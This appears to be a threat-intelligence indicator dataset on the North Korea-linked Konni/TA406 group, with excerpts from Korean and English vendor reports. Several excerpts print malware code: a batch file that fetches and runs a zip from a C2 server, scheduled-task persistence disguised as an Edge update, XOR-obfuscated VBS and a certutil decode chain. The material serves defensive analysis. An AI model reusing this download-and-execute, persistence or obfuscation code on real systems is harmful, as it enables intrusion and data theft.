1.0.0,actor--konni,artifact--sha256:2b8c151a03d9ba7acfe985b621e289a1bf82ac5c0d35d0ec63d1ddb28b0df9d5,observation--sha256:d2deff57b8b40352fb83f9cbb4c2222843350236061f33d52439234a73f53456,file-name,contents.php,contents.php,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■'resolvedns.bat' 파일코드분석 ○'resolvedns.bat' 파일은앞서작업스케줄러에등록된'install.vbs' 파일이실행될경우호출이됩니다. @echooff pushd""%~dp0"" set ttn=324093set tty=230704seturl=http://anrun[.]kr/movie/contents.php?fifo=%COMPUTERNAME% if exist ""stopedge.bat"" (del /f /qstopedge.bat)if exist ""%ttn%.zip"" (del /f /q%ttn%.zip)WScript.exeactivate.vbs ""%url%"" ""%ttn%.zip"" if exist ""%ttn%.zip"" (call unzip.exe-P""a"" -o""%~dp0%ttn%.zip"" >nuldel /f /q%~dp0%ttn%.zip>nulWScript.exe""%tty%.vbs""del /f /q%tty%.vbs >nul) [",
1.0.0,actor--konni,artifact--sha256:4888ed045d2ec455ee51d0a64909b1c5fbd749ba0597dd7cfe54d935da46122f,observation--sha256:cb304a49932384d8a6298421ea4aced432f423ce1aafb2aa728b06bdde9a3474,file-name,df.vbs,df.vbs,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"This was used to execute a VBS script named df.vbs (Figure 40) designed to perform reconnaissance on compromised device(s). Figure 40 df.vbs – reconnaissance VBS downloaded by FatBoy 36 TRIPLE THREAT: NORTH KOREA-ALIGNED TA406 STEALS, SCAMS, AND SPIES \ REPORT",
1.0.0,actor--konni,artifact--sha256:4888ed045d2ec455ee51d0a64909b1c5fbd749ba0597dd7cfe54d935da46122f,observation--sha256:e17155981b3b05a8d5a9f08a86d9196c3c9fbf3b5cf4d9ed57edabc8d5b51f3a,file-name,df.vbs,df.vbs,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 37}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,The VBS script collected extensive information about the device; the information was then sent via an HTTP POST request to the C&C server (Figure 41). Figure 41. HTTP POST generated by df.vbs TA406 operator(s) could theoretically use the initial reconnaissance script to identify interesting devices and then choose which infected device to upgrade to the next stage implant by changing the CAB file stored on the C&C server. Proofpoint observed no other malware during our analysis of this specific ,
1.0.0,actor--konni,artifact--sha256:3280eeda032974d2b922ed433423a5a600663806b09a1fd013fefa1ced037799,observation--sha256:dc1ab1077577e09ee3679e4226d1203f3e6571220092947fb1869f65e574fa12,file-name,download.php,download.php,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Potential victims may be lured into providing their personal or corporate credentials to access the PDF document (Figure 27). Figure 27. PDF decoy document accessible after providing credentials PHProxy TA406, to collect credentials, has used PHProxy, which proxies network traffic from a victim to the targeted email service. TA406 has used PHProxy to target at least Yahoo, Gmail and Daum users. Campaigns may consist of tricking a target into clicking a URL to download a file but are presented wi",
1.0.0,actor--konni,artifact--sha256:738192b8e6e5238e252b15c2a9d66d723dfb472401a13331e9af3eedba0abd11,observation--sha256:bf16411f5d2ff243677a0ee61e7176c6420a1bdcd276534f75250e4c71bab322,file-name,dp0install.vbs,dp0install.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.2. ZIP압축파일에포함된BAT파일분석■'stopedge.bat' 파일코드분석 ○ 'stopedge.bat' 파일은 'update.vbs' 파일에 의해 호출되는 배치 명령을 가지고있습니다. @echooff pushd""%~dp0""if exist ""paycom.ini"" (schtasks /create/scminute/mo33/tn""MicrosoftEdgeEasyUpdate"" /tr ""%~dp0install.vbs"" /fdel /f /q%~dp0paycom.ini) call versioninfo.batdel /f /qversioninfo.battimeout -t 5/nobreakdel /f /qupdate.vbs[표4-5] 'stopedge.bat' 파일명령어화면 ○배치파일은명령어내용이화면에출력되지않도록숨기기위해'echo off' 설정을하고, 'pushd ""%~dp0""' 선언으로 명령 프롬프트가 배치 파일이 존재하는 경로로설정합니다. ○다",
1.0.0,actor--konni,artifact--sha256:4d5a37a0ec2964d8d13c1a530a599de174adb872fd46d8213fbafc5961eb40cb,observation--sha256:667e9ffa616416afdd20ac01f894ddd700380bc3c26f33d637b464f8dd4ece41,file-name,dp0paycom.ini,dp0paycom.ini,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.2. ZIP압축파일에포함된BAT파일분석■'stopedge.bat' 파일코드분석 ○ 'stopedge.bat' 파일은 'update.vbs' 파일에 의해 호출되는 배치 명령을 가지고있습니다. @echooff pushd""%~dp0""if exist ""paycom.ini"" (schtasks /create/scminute/mo33/tn""MicrosoftEdgeEasyUpdate"" /tr ""%~dp0install.vbs"" /fdel /f /q%~dp0paycom.ini) call versioninfo.batdel /f /qversioninfo.battimeout -t 5/nobreakdel /f /qupdate.vbs[표4-5] 'stopedge.bat' 파일명령어화면 ○배치파일은명령어내용이화면에출력되지않도록숨기기위해'echo off' 설정을하고, 'pushd ""%~dp0""' 선언으로 명령 프롬프트가 배치 파일이 존재하는 경로로설정합니다. ○다",
1.0.0,actor--konni,artifact--sha256:e7d7c99d12a8d88ca47deb2ca53d7d8396b771c46363e45200ad041258100fec,observation--sha256:c00776d0a896bfd4e099a53c58d1b62d59bc00730d8d0b4965671809d4c94a02,file-name,dp0start.vbs,dp0start.vbs,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 23 c. ‘73888454.bat’ ○ VBS 다음에 실행되는 ‘73888454.bat’ 파일은 레지스트리 등록, 피해 컴퓨터 정보 수집 명령 호출, 파일 다운로드 등을 수행합니다. 파일명 73888454.bat MD5 29b3fa2293c63145e544318ca65a67cf SHA1 0fe0379d20570aaaaeac68ac0355feab514c7452 SHA256 14209a0d81a0d05757cf73a18c85cf0a1a6f13a042775430 0031e078ce128c32 [표 07] 73888454.bat 파일 HASH 정보 화면 ○ 본 일괄 배치 파일은 커맨드(CMD) 화면에 수행 내용이 출력되지 않도록 ‘@echo off’ 선언을 합니다. ○ 실행된 배치파일 위치를 저장하기 위해 ‘pushd ""%~dp0""’ 명령을 상단에 추가합니다. 그리고 ‘30966118.bat’ 파일",
1.0.0,actor--konni,artifact--sha256:875bc3f657c34c503c18a97aa1ebdcae79af251576b01488f592dab8b606df9b,observation--sha256:8c48b24dc8e2575340119c1baba025d2ae0c5481d90f4371ea43aff1f44dd7fa,file-name,existsinthestopedge.bat,existsinthestopedge.bat,candidate,,unknown,unknown,not-stated,,source--konni--8c179de8de042c5a,konni/the-konni-apt-chronicle-tracing-their-intelligence-driven-attack-chain.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TheKonni APTChronicle: TracingTheir Intelligence-DrivenAttackChain stopedge.bat If afilenamed""paycom.ini"" existsinthestopedge.bat’sdirectory, it schedulesatasktorun""install.vbs"" every33minutes, deletes""paycom.ini,"" calls""versioninfo.bat,"" waitsfor 5seconds, andthendeletes""versioninfo.bat"" and""update.vbs."" Figure11- Persistencymechanismwithscheduledtasks resolvedns.bat Thebatchscript 'resolvedns.bat' utilizes'activate.vbs' toinitiatethedownloadof afilefromtheC2server. Figure12- Dnsresolutionandge",
1.0.0,actor--konni,artifact--sha256:57490520e573df076a676ee7d81cd0da04b80022351c1aca79a45b1fe311d219,observation--sha256:33eb54a06e2ebfd488bd76c8be4d768a4bb8a425f19245068aef95c6cc1520a3,file-name,fontdrv.exe,fontdrv.exe,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"The initial dropper, named mt4managre.exe, used a PDB path of: E:\Work\_Spyware\VIRUS_2020\Release\Dropper_exe_ media.pdb. The dropper can have a variable number of embedded payloads, which is defined by the last four bytes (DWORD) of the file (Figure 44). Figure 44. YoreKey dropper encoded config and number of payloads This value is then multiplied by 76 to find the size of the config. The config precedes the last four bytes of the file. This particular dropper only had two embedded payloads, s",
1.0.0,actor--konni,artifact--sha256:e63e3b492a9805a26e3158f60dee369bdf4aba36f0ed9c1d3782dd2d64aee73f,observation--sha256:48e4f117f833a92f3aec869dfb4036ad47062333685dad9173c81f212972d183,file-name,).hwp,hwp,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 15 ○ 내부에 선언된 인자값은 LNK 전체 길이 ‘0x1466956A’ (342,267,242 바이트) 값을 확인합니다. 그리고 ‘0x00003C4A’ 오프셋 부터 ‘0x00006C00’ 값을 읽어 유니코드 이스케이프 포맷 6에 선언한 ‘소명자료 목록(국세징수법 시행규칙).hwp’ 파일로 생성 후 실행합니다. 그리고 기존 LNK 파일은 삭제됩니다. Unicode Escape Unicode Unescape \uC18C\uBA85\uC790\uB8CC \u0020\uBAA9\uB85D\u0028 \uAD6D\uC138\uC9D5\uC218 \uBC95\u0020\uC2DC\uD589 \uADDC\uCE59\u0029\u002E \u0068\u0077\u0070 소명자료 목록(국세징수법 시행규칙).hwp [표 03] 유니코드 문자 변환 화면 ○ 다음으로 ‘0x0000A84A’ 오프셋 부터 ‘0x0",
1.0.0,actor--konni,artifact--sha256:e63e3b492a9805a26e3158f60dee369bdf4aba36f0ed9c1d3782dd2d64aee73f,observation--sha256:9f39a1779e1da6c7093b61cc5880281316871d6620b65cbc0de371bb8db8b777,file-name,).hwp,hwp,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 16 인지세 조사 보고서(인지세 사무처리규정).hwp 자금출처명세서(부가가치세법 시행규칙).hwp [표 04] 압축 내부에 포함된 정상 문서 화면,
1.0.0,actor--konni,artifact--sha256:e63e3b492a9805a26e3158f60dee369bdf4aba36f0ed9c1d3782dd2d64aee73f,observation--sha256:f4cb339c0033f9535dc42d4067a568014c11ef63e9f94c6a9607854dc9c6199d,file-name,).hwp,hwp,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 20 ○ 한편, 초기에 악성 LNK 파일이 실행되고, ‘04769.zip’ 파일과 함께 생성된 정상 ‘소명자료 목록(국세징수법 시행규칙).hwp’ 파일은 다음과 같이 보여집니다. [그림 10] LNK 내부에 포함돼 있던 정상 문서 파일 화면",
1.0.0,actor--konni,artifact--sha256:e63e3b492a9805a26e3158f60dee369bdf4aba36f0ed9c1d3782dd2d64aee73f,observation--sha256:8ba551533ee8698037e1bbe9801d435e16f8d4809a1c073265cf13a67eb205d8,file-name,).hwp,hwp,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 6 e. EDR 솔루션을 통한 가시성 확보 (Visibility) ○ 본 사례의 경우 악성 LNK 바로가기 파일 구조 내부에 ‘자금출처명세서(부가가치세법 시행규칙).hwp’ 정상 문서와 ‘04769.zip’ 파일이 임베디드 된 형태로 보관되어 있습니다. 정상 문서 파일은 LNK 파일이 실행된 경로에 만들어지고, 압축 파일은 ‘Public’ 공용 폴더 경로에 생성됩니다. 압축은 공용 경로 하위의 ‘Documents’ 공용 문서 경로에 풀리고, ‘start.vbs’ 파일이 실행되는 과정을 거치게 됩니다. ○ ‘04769.zip’ 파일 내부에는 총 5 개의 BAT 파일이 존재하고, ‘start.vbs’ 파일에 의해 맨 처음 호출되며, 배치 파일 내부명령에 따라 순차적으로 악성 행위를 수행하게 됩니다. 물론 변형에 따라 복잡도는 조금씩 차이가 발생합니다. Genian EDR 3 제품은 이처럼 복잡성을",
1.0.0,actor--konni,artifact--sha256:5b0060e189a751d5e5b54a19d2e2395372b1ce63af48cf0dc81507c43c018803,observation--sha256:7b58d4f57306461d8c8a0da6cee5c45e1341d207e0f834625e4eaf3a925af79d,file-name,).hwp.lnk,hwp.lnk,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 10 감정평가 실시에 따른 협조 안내.hwp.lnk 거래사실 확인신청서(매입자발행세금계산서 발급용)(부가가치세법 시행규칙).hwp.lnk 결제대금예치 이용 확인증(전자상거래 등에서의 소비자보호에 관한 법률 시행규칙).hwp.lnk 기타서식 제 00 호 성실신고확인서.hwp.lnk 비정기 세무조사 통지서.hwp.lnk 세무조사출석요구.hwp.lnk 소득세법 제 20 호(5) 주요경비지출명세서.hwp.lnk 소명자료 목록(국세징수법 시행규칙).hwp.lnk 영수증수취명세서.hwp.lnk 자금출처명세서(부가가치세법 시행규칙).hwp.lnk 통신판매업 신고증(전자상거래 등에서의 소비자보호에 관한 법률 시행규칙).hwp.lnk [표 01] 유사 변종 LNK 악성 파일명 비교 화면 ○ 압축이 해제된 후 ‘소명자료 목록(국세징수법 시행규칙).hwp.lnk’ 파일이 실행될 경우 본격적인 악성 명령이 작동하며,
1.0.0,actor--konni,artifact--sha256:5b0060e189a751d5e5b54a19d2e2395372b1ce63af48cf0dc81507c43c018803,observation--sha256:c57b3cf32ab28c3e7ce0944bba3742cc674b56472ea1a67d02c8564013617bca,file-name,.hwp.lnk,hwp.lnk,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 11 ○ 악성 파일 이름의 형식은 [문서명.hwp.lnk] 2 중 확장자 구조를 가지고 있는데, 주로 한컴 오피스 HWP 문서처럼 위장한 LNK 바로가기 형식입니다. 바로가기 파일을 이메일에 직접 첨부할 경우 의심도가 높아질 수 있기에 압축을 하여 전송하게 됩니다. 실제 압축 파일 내부에 LNK 파일만 단독으로 포함한 사례도 있었지만, 대체로 1~3 개 이상의 정상 문서 파일을 동봉해 현혹하는 경우가 다수 입니다. ○ 이런 형식의 공격을 사전에 인지하고 피해를 최소화하기 위해 이메일에 첨부된 압축 파일은 각별한 주의가 필요합니다. 압축 내부에 포함된 파일은 실행하기 전에 유심히 관찰할 필요가 있습니다. 눈속임 목적의 다중 확장자는 아닌지, 파일 사이즈가 비정상적으로 큰 경우는 아닌지 등 악용 소지 유무를 꼼꼼히 살펴보는 보안 습관을 통해 어느정도 사전 예방이 가능합니다. ○ 참고로 윈도 OS ",
1.0.0,actor--konni,artifact--sha256:5b0060e189a751d5e5b54a19d2e2395372b1ce63af48cf0dc81507c43c018803,observation--sha256:131ab860dd942dc2346e7bf4456ead25508ca8d31e1b98e6a9329d4ee3b1c92a,file-name,).hwp.lnk,hwp.lnk,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 12 03. 위협 분석 (Threat Analysis) a. ‘소명자료 목록(국세징수법 시행규칙).hwp.lnk’ ○ ‘소명자료 목록(국세징수법 시행규칙).hwp.lnk’ 파일은 전형적인 LNK 유형의 악성 명령을 담고 있습니다. 우선 LNK 속성 정보 중 ‘대상’ 경로 앞단에 ‘%windir%\system32\cmd.exe’ 명령과 함께 별도의 인자가 실행되도록 구성되지만 화면상에 보이지는 않습니다. 그리고 ‘설명' 부분에는 마치 문서처럼 ‘hwp file’ 문구를 삽입한 것도 특징입니다. [그림 07] LNK 속성 정보 화면,
1.0.0,actor--konni,artifact--sha256:5b0060e189a751d5e5b54a19d2e2395372b1ce63af48cf0dc81507c43c018803,observation--sha256:2925df4f1f52a5bdfe7fc28e4c7f4631bf27054416fb79c055af0df29a4509f0,file-name,).hwp.lnk,hwp.lnk,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 2}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 1 - 목차 (CONTENTS) – 01. 개요 (Overview) ................................................................................................ 2 a. 금융 및 기밀정보 위협 식별 (Threat Hunting) .................................................. 2 b. 악성 파일 동작 흐름도 (Malware Flowchart) .................................................... 3 c. Konni 배경 (Background) .............................................................................. 4 d. 공격 전술 및 기술, 절차 (TTPs) &",
1.0.0,actor--konni,artifact--sha256:5b0060e189a751d5e5b54a19d2e2395372b1ce63af48cf0dc81507c43c018803,observation--sha256:836b077570c6e074a34ce67fdeccf5341a9505875682051068f3c32ad7e14085,file-name,).hwp.lnk,hwp.lnk,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 3}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 2 ◈ 주요 요약 (Executive Summary) ● 국세청 우편물 센터 발송알림 서비스로 위장 후 소명자료 제출 요청 안내 ZIP 파일 전달 ● ‘소명자료 목록(국세징수법 시행규칙).hwp.lnk’ 파일명의 LNK 악성 코드 사용 ● 세무 사무실에서 보낸 특정 기업 급여대장으로 위장해 CHM 악성 파일 활용 수법 존재 ● 공정거래위원회 서면 실태조사 사전 예고 안내통지문 사칭 등 유사 위협 다수 보고 ● 코니(Konni) APT 위협 캠페인과 TTPs 일치, 다양한 변종 공격 국내서 지속 전개 중 01. 개요 (Overview) a. 금융 및 기밀정보 위협 식별 (Threat Hunting) ○ 지난 6 월 27 일 지니언스 시큐리티 센터(이하 GSC)는 북한배후 해킹 그룹으로 지목된 코니(Konni)의 새로운 사이버 위협 활동을 식별했습니다. GSC 는 본 위협 캠페인이 수년간 국내에서",
1.0.0,actor--konni,artifact--sha256:5b0060e189a751d5e5b54a19d2e2395372b1ce63af48cf0dc81507c43c018803,observation--sha256:57dfb63c29c7d848b0df1a4234371d8339881b682ec4da4b3db3b205d577da7d,file-name,).hwp.lnk,hwp.lnk,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 3 b. 악성 파일 동작 흐름도 (Malware Flowchart) ○ 세금 관련 이슈는 기업 관계자로서 매우 민감한 소재 중 하나로 실제 공격을 받은 대상자는 대북분야 기업의 대표입니다. 수신자로 하여금 불안 심리를 증폭시켜, 첨부 파일에 대한 접근을 보다 빠르게 만들기 위한 위협 전략으로 관측됩니다. 이메일에는 ‘소명자료 제출요청 안내.zip’ 이름의 압축 파일이 첨부돼 있으며, 압축 파일 내부에는 2 개의 HWP 문서 파일과 1 개의 LNK 바로가기 파일이 포함돼 있습니다. LNK 파일명은 ‘소명자료 목록(국세징수법 시행규칙).hwp.lnk’ 입니다. ○ ‘ 소명자료 목록(국세징수법 시행규칙).hwp.lnk’ 바로가기 파일이 실행되면 피해자 컴퓨터의 주요 정보를 수집해 유출을 시도하고, 순차적 다단계 (VBS, BAT, Powershell) 명령을 통해 추가 악성 파일 설치 등 잠재적 위",
1.0.0,actor--konni,artifact--sha256:9aff5a9631c8db365bbb59b56e6c38a9855b9ab8d7a5a1ab9a6fa2243ce680a1,observation--sha256:502219e0b777d4591196df1be7ed7c8c315b40364ded7e0eadbe1102f30a0439,file-name,index.php,index.php,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 28}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Notable 2021 Malware Campaigns March 2021 In March 2021, TA406 shifted from concentrating exclusively on credential-capture activities to distributing malware via email. Messages purported to be from Chad O’Carroll, a prominent DPRK foreign policy specialist and CEO/Managing Director of Korea Risk Group, and targeted North American entities (Figure 30). The campaign referenced the DPRK short-range cruise missile tests that occurred on or around March 21, 2021. Figure 30. Phishing message with UR",
1.0.0,actor--konni,artifact--sha256:b545f965ebd65332b6239966a8eb12c132eb2a4306d7306bfcba79fc30e75f1c,observation--sha256:972dd22c7f58ae5ea0041e9920b0f5da242fb187f8bafc43636256daea00dc4b,file-name,install.bat,install.bat,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 34}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Command Purpose cd /d %USERPROFILE% Set current directory to %USERPROFILE% findstr /b “TVNDR” “[path from ActiveDocument.FullName]”>xtong.txt Use findstr to parse the Word document looking for the string “TVNDR” that follows a new line and then writes all following data to xtong.txt certutil -decode -f xtong.txt xto.c Use certutil to Base64 decode the data in xtong.txt and save to xto.c, which resulted in a CAB file being saved to xto.c expand -f:* xto.c %USERPROFILE% Use the expand command to e",
1.0.0,actor--konni,artifact--sha256:ad3e70b6cc31ebde0dc82c7b31c262aecf8df7e4f94bba5a25f3b2a19d1ff5e5,observation--sha256:f75e097dc1b5896dc9f2c76989f710b9d862ad78129ebd76d1a1c01cb25b53c0,file-name,(install.vbs,install.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport [그림3-3] 'update_cmd.zip' 압축해제후화면 ○각파일의정보를간략히살펴보면다음과같습니다. 'unzip.exe' 파일은압축해제용도의정상유틸리티로이것을제외하면나머지는모두악성파일입니다. 파일명 정보(크기, 기능, MD5) update.vbs 1,579바이트 stopedge.bat 호출 90468e4bdf61cf146030515ed3e15d81 stopedge.bat 271바이트 'paycom.ini' 조건문에따라작업스케줄러등록(install.vbs호출) 및'paycom.ini' 삭제, 'versioninfo.bat' 호출및삭제, 'update.vbs' 삭제 ff4067b4865c9b49da2f28ac12ca5c1a paycom.ini 475바이트 셋업조건및특정제품고유식별자( GUID형식) 목록의설치나변경을차단하는설정파일 75ca52afafe3fe6c053da9f1db90590a Genians SecurityCenter 12",
1.0.0,actor--konni,artifact--sha256:ad3e70b6cc31ebde0dc82c7b31c262aecf8df7e4f94bba5a25f3b2a19d1ff5e5,observation--sha256:be49fb89c5f24dc27ae39fa152c28bc2c2ad4ed510a7db2d036df2e866f2e490,file-name,install.vbs,install.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport install.vbs 1,652바이트 resolvedns.bat 호출 db31a36e1684c568fa3529d60a59ba29 versioninfo.bat 1,143바이트 시스템정보수집및anrun[.]kr 서버로유출시도 168bcc063501d191d82aaa3a32741a12 unactivate.vbs 6,644바이트 XMLHTTPPOSTContent-Typeform명령어 6b944c9dc4b760fffb56adf4fecf6764 resolvedns.bat 432바이트 anrun[.]kr 서버에서324093.zip다운로드및실행시도 892bd45372876d29e883e114981e311b activate.bat 2,331바이트 XMLHTTPGETAdodb.Stream명령어 b86c38ae5c24c55831d7f8ca3cbeb814 unzip.exe 167,936바이트 Unzip5.52압축해제정상유틸리티 75375c22c72f1beb7",
1.0.0,actor--konni,artifact--sha256:ad3e70b6cc31ebde0dc82c7b31c262aecf8df7e4f94bba5a25f3b2a19d1ff5e5,observation--sha256:4f638b9204dee9e5ba70cbc613e28136b8c256f478fa84b5b31ae019f5696d8f,file-name,install.vbs,install.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○ 주요 문자열은 10진수 값으로 선언되어 있고, XOR 로직을 통해 ASCII 문자로변환되는과정을거치게됩니다. [그림4-1] 'update.vbs' XOR연산부분을ASCII 문자로치환한화면 ○ 25개의 연산 항목을 문자열로 변경하면 다음과 같이 Windows Script Host(WScript.Shell) 를사용하여'stopedge.bat' 배치파일을호출하여실행하는것을알수있습니다. ■'install.vbs' 파일코드분석 ○'install.vbs' 파일은'stopedge.bat' 배치파일의내부명령조건(' paycom.ini' 파일존재의경우)에따라작업스케줄러( Schtasks) 로등록된후호출되는과정을거칩니다. Genians SecurityCenter 19",
1.0.0,actor--konni,artifact--sha256:ad3e70b6cc31ebde0dc82c7b31c262aecf8df7e4f94bba5a25f3b2a19d1ff5e5,observation--sha256:773c899b476ebacf85a7c6cb1376e6ec714ebf68d2667a4eac22f50bba6930c0,file-name,install.vbs,install.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport GXZ4036PV=""eC9NM;['vB{,*""BW0npws9Nc5r1=BW0npws9Nc5r1&Chr(52721Xor52646):BW0npws9Nc5r1=BW0npws9Nc5r1&Chr(25801Xor 25754)BW0npws9Nc5r1=BW0npws9Nc5r1&Chr(18708Xor18807):BW0npws9Nc5r1=BW0npws9Nc5r1&Chr(8977Xor 9059)BW0npws9Nc5r1=BW0npws9Nc5r1&Chr(46973Xor46868):BW0npws9Nc5r1=BW0npws9Nc5r1&Chr(21435Xor21451):BW0npws9Nc5r1=BW0npws9Nc5r1&Chr(29443Xor29559):BW0npws9Nc5r1=BW0npws9Nc5r1&Chr(30634Xor30596):BW0npws9Nc5r1=BW0npws9Nc5r1&Chr(26068Xor25991):BW0npws9Nc5r1=BW0npws9Nc5r1&",
1.0.0,actor--konni,artifact--sha256:ad3e70b6cc31ebde0dc82c7b31c262aecf8df7e4f94bba5a25f3b2a19d1ff5e5,observation--sha256:b95720a0b0bb5b784ee49692097f9cf199992641805878666afb57d12cd13b61,file-name,install.vbs,install.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 22}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport [그림4-2] 'install.vbs' XOR연산부분을ASCII 문자로치환한화면 ○ 27개의 연산 항목을 문자열로 변경하면 다음과 같이 Windows Script Host(WScript.Shell) 를사용하여'resolvedns.bat' 배치파일을호출하여실행하는것을알수있습니다. ■'activate.vbs' 파일코드분석 ○'activate.vbs' 파일은'resolvedns.bat' 파일에의해호출되는스크립트입니다. 해당스크립트는C2 서버( anrun[.]kr) 에서지정된컴퓨터명(% COMPUTERNAME%) 으로별도 조건에 따라 연결되며, 지정된 환경변수명( ttn) 과 zip 확장자가 결합된'324093.zip' 파일을다운로드하는데사용됩니다. OnError ResumeNext Genians SecurityCenter 21",
